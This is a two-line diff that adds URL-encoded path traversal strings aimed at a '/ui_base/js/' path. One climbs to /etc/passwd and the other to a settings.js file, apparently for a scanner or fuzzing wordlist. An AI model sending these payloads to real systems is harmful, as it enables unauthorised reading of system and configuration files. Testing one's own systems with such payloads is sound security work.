@@ -1,0 +1,2 @@
+/ui_base/js/..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2fetc%2fpasswd
+/ui_base/js/..%2f..%2f..%2f..%2fsettings.js
